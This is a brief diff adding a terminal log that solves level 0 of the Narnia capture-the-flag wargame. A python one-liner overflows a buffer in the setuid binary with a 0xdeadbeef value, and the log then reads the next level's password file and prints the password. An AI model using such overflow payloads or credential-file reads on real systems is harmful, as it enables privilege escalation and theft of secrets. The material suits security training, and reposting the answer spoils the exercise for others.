@@ -1,0 +1,5 @@
+narnia0@narnia:~$ (python -c'print "A"*20 + "\xef\xbe\xad\xde"'; cat) | /narnia/narnia 
+cat /etc/narnia_pass/narnia1
+efeidiedae
+
+
